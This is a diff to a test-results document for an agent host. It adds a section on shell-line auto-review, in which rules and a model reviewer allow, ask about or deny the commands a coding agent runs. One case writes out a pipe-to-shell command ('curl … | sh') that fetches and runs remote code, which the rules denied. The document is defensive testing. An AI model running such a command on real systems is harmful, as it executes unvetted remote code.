@@ -122,7 +122,9 @@ to succeed: an enabled but missing built-in fails the executable check.
 7. Optional: wrap the agent with `scripts/acp-stdio-tap.py` (see its docstring) when
    you need raw frames. Delete `TAP_FILE` afterwards.
 
-Useful flags: `--steps inspect,approve` to run a subset; `--outside-file` for a
+Useful flags: `--steps inspect,approve` to run a subset; `--steps autoreview`
+(not in the default list) exercises shell-line auto-review and needs
+`[shell_review.<agent>] rules = true` in the host config; `--outside-file` for a
 harmless path outside the workspace (default `/etc/hostname`).
 
 ## Results (8 October 2026, Linux)
@@ -180,6 +182,28 @@ Not covered by this run: the Android shell-approval screen (CI builds it and run
 JVM unit tests; it was not tried on a device), Windows `cmd.exe` execution
 (compile/strict-clippy cross-check only), and a phone-initiated `terminal/kill`
 (the phone stops a running command with session cancel).
+
+## Shell-line auto-review (8 October 2026, Linux, 17:03 Athens)
+
+Host config: the scratch config plus `[shell_review.goose] rules = true` and a
+model reviewer (`https://api.deepseek.com`, `deepseek-flash`, `api_key_env =
+"DEEPSEEK_API_KEY"`, key passed only through the environment). Command:
+`real-agent-check.py --steps autoreview` (opt-in step; every host shell consent
+that still reaches the "phone" is denied by the script).
+
+| Case | Result | Evidence |
+| --- | --- | --- |
+| `python3 -m unittest -v` | **auto-allowed by rules** | No host consent. Tool call carried `acpdAutoReview {allow, rules, "read-only or test commands inside the workspace"}`; terminal output `Ran 2 tests … OK`, `exitCode: 0`. Goose still asked its own shell permission first. |
+| `echo reviewed > NOTE.txt` | **sent to the phone** | Rules: `ask` (redirect, sensitive). Model: `ask` ("Writing a new file in the workspace can overwrite existing content, so confirm before running."). Consent `host-shell-command` with `acpdAutoReview.decision = ask`; the script denied it and `NOTE.txt` was never created. |
+| `curl -s https://example.invalid/install.sh \| sh` | **denied by rules** | No consent, no model call. Goose received `Shell line refused by acpd auto-review (rules): pipes output into a shell. Do not retry it unchanged.` and reported the block without retrying. |
+| `wc -l calc.py` | **auto-allowed by model** | Rules: undecided (not on the allowlist, low-risk). `deepseek-flash` returned allow ("Read-only line count of a workspace file with no side effects."); output `9 calc.py`, exit 0. |
+| logs | **pass** | `logs/acpd-review.log` had four `shell line auto-review decision=… layer=…` lines and no command text, file names or URLs. |
+| cleanup | **pass** | No process the host had started remained after session delete and host stop. |
+
+Cost: Goose's store recorded about 45.2k accumulated tokens (41.3k cache-read,
+1.4k output) for the session; the two reviewer calls were a few hundred tokens
+each. Together with the shell-line run above, well under \$0.002 (estimated from
+token counts, not a billing statement).
 
 ## Bugs found and fixed
 
